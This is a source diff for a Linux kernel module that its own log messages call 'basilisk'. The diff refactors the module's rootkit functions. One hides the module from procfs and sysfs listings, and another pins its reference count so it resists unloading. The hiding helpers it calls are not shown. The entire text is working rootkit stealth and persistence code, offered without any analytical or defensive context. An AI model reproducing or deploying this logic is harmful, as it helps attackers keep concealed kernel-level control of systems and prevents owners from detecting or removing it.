@@ -123,6 +123,8 @@ struct kobject *this_kobj;
 struct module_sect_attrs *sect_attrs_prev;
 struct module_notes_attrs *notes_attrs_prev;
 
+static bool hidden = false;    // toggle for hiding from sysfs/procfs
+static bool protected = false; // toggle for inc/decrementing module ref count
 
 // Workaround for kernel >4.15.0 error. Sets this_kobj. Only execute in module_init
 static void init_this_kobj(void) {
@@ -240,24 +242,26 @@ a zero return means that the try failed, and the module should not be used.
 Failure can happen, for example, when the module is in the process of being unloaded.
 
 A reference to a module can be released with module_put().
+
+NOTE: The module can still be removed with rmmod -f [MOD] if the kernel was compiled this way.
 */
-void handle_lkm_protect(bool *p_flag) {
-    if (!(*p_flag)) {
+void handle_lkm_protect(void) {
+    if (!protected) {
         pr_info("basilisk: protecting kernel module\n");
         try_module_get(lkm.this_mod);
     } else {
         pr_info("basilisk: un-protecting kernel module\n");
         module_put(lkm.this_mod);
     }
-    *p_flag = !(*p_flag);
+    protected = !protected;
 }
 
 /*
 Helper function to handle hiding/showing our LKM 
 */
-void handle_lkm_hide(bool *h_flag)
+void handle_lkm_hide(void)
 {
-    if(!(*h_flag)) {
+    if(!hidden) {
         pr_info("basilisk: hiding kernel module\n");
         proc_hide();
         sys_hide();
@@ -266,5 +270,5 @@ void handle_lkm_hide(bool *h_flag)
         proc_show();
         sys_show();
     }
-    *h_flag = !(*h_flag); // toggle `hidden` switch
+    hidden = !hidden; // toggle `hidden` switch
 }
